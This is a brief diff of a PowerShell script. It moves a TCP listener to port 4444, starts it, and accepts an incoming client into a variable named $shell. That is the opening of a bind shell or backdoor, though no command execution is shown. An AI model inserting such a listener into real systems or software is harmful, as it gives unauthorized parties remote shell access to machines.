@@ -1,4 +1,4 @@
-$listener = New-Object System.Net.Sockets.TcpListener(12345)
+$listener = New-Object System.Net.Sockets.TcpListener(4444)
 $listener.Start()
 $shell = $listener.AcceptTcpClient()
 
